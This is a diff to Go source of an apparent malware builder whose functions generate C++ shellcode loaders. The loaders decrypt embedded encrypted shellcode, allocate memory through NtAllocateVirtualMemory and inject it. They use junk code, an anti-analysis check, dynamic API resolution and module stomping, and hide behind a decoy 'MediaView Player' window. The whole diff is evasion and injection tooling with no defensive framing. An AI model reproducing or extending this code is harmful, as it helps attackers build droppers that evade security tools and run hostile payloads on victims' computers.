@@ -955,11 +955,10 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 
 func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize int, privateKey string, embedKey bool) string {
 	var sb strings.Builder
-	sb.WriteString("#include <windows.h>\n#include <objbase.h>\n#include <mfapi.h>\n#include <cstring>\n#include <string>\n#include <cstdint>\n")
+	sb.WriteString("#include <windows.h>\n#include <cstring>\n#include <string>\n#include <cstdint>\n#include <cstdlib>\n")
 	sb.WriteString("#include \"RSA.h\"\n\n")
 	sb.WriteString(callbackSemanticPad)
-	sb.WriteString(callbackDynAPIFullCpp())
-	sb.WriteString(callbackModuleStompDynCpp())
+	sb.WriteString(callbackDynAPICpp())
 	writeResLoaderCode(&sb, encSize, realSize, 0)
 	if embedKey {
 		escapedKey := strings.ReplaceAll(privateKey, `\`, `\\`)
@@ -968,8 +967,6 @@ func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize i
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString(callbackJunkBlock())
-		sb.WriteString("    MediaInit();\n")
 		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
@@ -983,8 +980,6 @@ func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize i
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString(callbackJunkBlock())
-		sb.WriteString("    MediaInit();\n")
 		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
@@ -1014,7 +1009,7 @@ func oxuGenerateLoaderEclX64(encodedData []byte, encSize, realSize int, key stri
 	sb.WriteString("typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(\n")
 	sb.WriteString("    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,\n")
 	sb.WriteString("    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);\n\n")
-	sb.WriteString(eclSHA256Cpp)
+	sb.WriteString(eclBCryptSHA256Cpp)
 	eclWriteEncData(&sb, encodedData, encSize, realSize)
 	eclWriteRevTable(&sb, key)
 	eclWriteKeyAndDecode(&sb, embedKey, key)
@@ -1050,7 +1045,7 @@ func oxuGenerateLoaderEclX86(encodedData []byte, encSize, realSize int, key stri
 	var sb strings.Builder
 	sb.WriteString("#include <windows.h>\n#include <cstdint>\n#include <cstring>\n")
 	sb.WriteString("#include \"WindowsShellcodeInjector.h\"\n\n")
-	sb.WriteString(eclSHA256Cpp)
+	sb.WriteString(eclBCryptSHA256Cpp)
 	eclWriteEncData(&sb, encodedData, encSize, realSize)
 	eclWriteRevTable(&sb, key)
 	eclWriteKeyAndDecode(&sb, embedKey, key)
